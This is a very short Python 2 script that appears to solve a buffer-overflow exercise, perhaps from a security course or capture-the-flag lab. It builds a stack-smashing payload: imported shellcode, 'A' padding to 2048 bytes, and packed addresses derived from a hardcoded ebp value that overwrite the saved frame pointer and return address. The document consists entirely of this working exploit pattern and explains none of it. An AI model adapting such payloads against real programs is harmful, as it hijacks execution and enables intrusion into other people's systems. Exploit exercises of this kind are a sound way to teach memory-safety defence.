from shellcode import shellcode
from struct import pack

ebp = 0xbffe9988;

print shellcode + 'A'*(2048-len(shellcode)) + pack('<I',ebp-2048-4-4-8) + pack('<I',ebp+4)
